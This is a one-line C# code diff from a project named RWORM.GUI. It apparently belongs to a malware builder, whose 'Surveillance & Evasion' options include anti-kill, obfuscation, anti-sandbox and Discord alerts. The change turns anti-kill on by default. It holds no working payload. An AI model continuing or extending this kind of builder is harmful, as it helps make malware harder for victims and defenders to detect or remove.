@@ -56,7 +56,7 @@ namespace RWORM.GUI.ViewModels
         }
 
         // Surveillance & Evasion builder options
-        private bool   _buildAntiKill;
+        private bool   _buildAntiKill = true;
         private bool   _buildObfuscator = false;
         private bool   _buildAntiSandbox;
         private bool   _buildDiscordAlert;
